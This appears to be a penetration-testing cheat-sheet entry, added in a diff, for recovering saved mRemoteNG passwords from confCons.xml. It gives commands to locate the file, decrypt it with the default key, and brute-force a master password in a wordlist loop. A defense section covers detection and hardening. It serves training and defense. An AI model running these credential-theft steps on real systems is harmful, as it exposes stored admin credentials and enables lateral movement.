@@ -1,0 +1,94 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "mremoteng-decrypt"
+  ],
+  "tags": [
+    "mremoteng",
+    "decrypt",
+    "credentials"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Pillaging",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Locate the confCons.xml config",
+      "command": "ls C:\\Users\\julio\\AppData\\Roaming\\mRemoteNG"
+    },
+    {
+      "label": "Decrypt with the default master password",
+      "command": "python3 mremoteng_decrypt.py -s \"sPp6b6Tr2iyXIdD/KFNGEWzz...\""
+    },
+    {
+      "label": "Decrypt with a known custom password",
+      "command": "python3 mremoteng_decrypt.py -s \"EBHmUA3DqM3s...\" -p admin"
+    },
+    {
+      "label": "Brute-force the master password from a wordlist",
+      "command": "for password in $(cat fasttrack.txt);do python3 mremoteng_decrypt.py -s \"<blob>\" -p $password 2>/dev/null;done"
+    }
+  ],
+  "notes": "=== mRemoteNG Credential Extraction ===\nmRemoteNG stores encrypted connection passwords in confCons.xml — decrypt with Python script.\n\n=== TECHNICAL DETAILS ===\nmRemoteNG: remote connection manager aggregating credentials for RDP, SSH, VNC, Telnet, etc.\nStorage: %APPDATA%\\mRemoteNG\\confCons.xml\nEncryption: AES-GCM with key derived from master password\nDefault master password: mR3m (hardcoded when no custom password set)\nThe Python script mremoteng_decrypt.py handles both default and custom master passwords\n\n=== FINDING confCons.xml ===\n  Get-Item $env:APPDATA\\mRemoteNG\\confCons.xml\n  Get-ChildItem -Path C:\\Users -Recurse -Include confCons.xml -ErrorAction SilentlyContinue\n\nconfCons.xml structure: XML with Node elements, each containing Name, Hostname, Username, Password (base64-encoded encrypted blob)\n\n=== DECRYPTION — DEFAULT MASTER PASSWORD ===\n  python3 mremoteng_decrypt.py -s <base64_password_value>\n  → Returns plaintext credential for that connection\n  The default password mR3m is tried automatically when no -p flag is given\n\n=== DECRYPTION — CUSTOM MASTER PASSWORD (BRUTE FORCE) ===\nWrong password causes AES-GCM MAC verification failure (not silent wrong result) — detectable:\n  for password in $(cat wordlist.txt); do\n    result=$(python3 mremoteng_decrypt.py -s <hash> -p \"$password\" 2>/dev/null)\n    [[ $? -eq 0 ]] && echo \"Password: $password, Decrypted: $result\"\n  done\n\nProtected attribute in XML root element: cracking this yields \"Password: ThisIsProtected\" — not useful\nTarget Node elements' Password attributes instead for actual credentials\n\n=== CHAINING CONTEXT ===\nconfCons.xml with default master password → instant decryption of all stored credentials\nmRemoteNG on sysadmin workstation → credentials for all managed servers, network devices, DCs\nDecrypted RDP credentials → direct access to servers without further exploitation\nSSH credentials in mRemoteNG → pivot to Linux/Unix infrastructure\n\n=== WHAT TO LOOK FOR ===\nmRemoteNG in installed software (wmic product) → find confCons.xml\nconfCons.xml in sysadmin home directories or shared network paths (team shares confCons.xml)\nMultiple Node entries = multiple server credentials in one file\nSweep all user AppData directories after local admin escalation",
+  "references": [
+    {
+      "title": "mRemoteNG-Decrypt (haseebT)",
+      "url": "https://github.com/haseebT/mRemoteNG-Decrypt"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "browser-cookie-theft",
+      "note": "Next pillaging step once you're that user.",
+      "rel": "next"
+    },
+    {
+      "id": "chain-pillaging-to-system",
+      "note": "Full pillaging-to-SYSTEM walkthrough.",
+      "rel": "next"
+    }
+  ],
+  "id": "mremoteng-decrypt",
+  "name": "Pillaging - Decrypt mRemoteNG Passwords",
+  "command": "python3 mremoteng_decrypt.py -s \"<encrypted_string>\"",
+  "description": "mRemoteNG stores connection passwords in confCons.xml encrypted with a hardcoded default key (mR3m). Decrypt them directly, or brute-force a custom master password with a wordlist.",
+  "opsec": "loud",
+  "mitre": [
+    "T1555"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "mRemoteNG stores saved connection passwords encrypted in confCons.xml. By default (and for most users in practice), the encryption uses the default hardcoded key (mR3m). The mremoteng_decrypt.py script implements the same AES decryption to recover all saved connection passwords from the XML file without any credentials.",
+    "prerequisites": "Read access to confCons.xml (typically in %APPDATA%\\mRemoteNG). mremoteng_decrypt.py available. Python installed.",
+    "impact": "Recovery of all saved RDP, SSH, Telnet, and VNC credentials stored in mRemoteNG — typically admin credentials for all managed servers — enabling full lateral movement.",
+    "detection": "Read access to confCons.xml by non-mRemoteNG process. mremoteng_decrypt.py execution. Transfer of confCons.xml to external system. SIEM: sensitive credential file accessed by unexpected process.",
+    "artifacts": "File access: confCons.xml read by non-mRemoteNG process | Process: mremoteng_decrypt.py executed | Network: confCons.xml transferred to attacker",
+    "prevention": "Configure a custom master password in mRemoteNG (Extras > Options > Advanced > Encryption Password) — this replaces the default key. Restrict read permissions on confCons.xml. Store mRemoteNG config on encrypted storage. Regularly rotate credentials in mRemoteNG connections.",
+    "misconfiguration": "mRemoteNG configured with default encryption key (no master password set). confCons.xml accessible to other local users or backup systems. Admin credentials stored in mRemoteNG without a custom master password.",
+    "vulnerable_config": "# confCons.xml with encrypted passwords (default key):\n# <Node Password='nHkTL3aLdJYKGi35g...' />\n\n# Decrypt with default key:\npython3 mremoteng_decrypt.py -s 'nHkTL3aLdJYKGi35g...'\n# Outputs: P@ssw0rd2024!",
+    "secure_config": "# Set custom master password in mRemoteNG:\n# Extras > Options > Advanced > Encryption Password\n# Enter strong master password\n\n# Restrict confCons.xml permissions:\nicacls '%APPDATA%\\mRemoteNG\\confCons.xml' /inheritance:r /grant \"%USERNAME%:(R,W)\"\n\n# Enable file access auditing on confCons.xml",
+    "sources": [
+      "HTB M26",
+      "MITRE T1552.001",
+      "MITRE T1555"
+    ]
+  }
+}
